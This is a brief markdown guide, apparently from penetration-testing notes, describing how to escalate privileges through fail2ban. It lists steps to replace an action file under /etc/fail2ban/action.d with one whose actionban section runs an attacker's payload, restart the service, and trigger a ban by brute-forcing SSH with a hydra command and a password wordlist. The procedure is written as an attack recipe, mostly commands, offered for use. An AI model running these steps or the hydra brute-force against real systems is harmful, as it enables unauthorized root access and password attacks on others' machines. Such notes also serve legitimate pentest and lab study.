# How Escalate Privileges via Fail2Ban
## Requirement
- You need write permission under `/etc/fail2ban/action.d/`
- You must be able to restart the fail2ban service (sudo, cron, etc)
## Explotation
For example, we have a config according to which we will be banned after 3 failed login attempts in ssh. You can check config here ``/etc/fail2ban/jail.conf`
1. `cp /etc/fail2ban/action.d/iptables-multiport.conf .`
2. Edit `actionban` or any other section (It will depend on what will be the trigger for the execution of the payload) with your payload
3. `rm /etc/fail2ban/action.d/iptables-multiport.conf`
4. `cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf`
5. Somehow restart service `sudo fail2ban restart`
6. Trigger ban action. For example for ssh `hydra x.x.x.x -l root -P ~/rockyou-30.txt ssh -v`
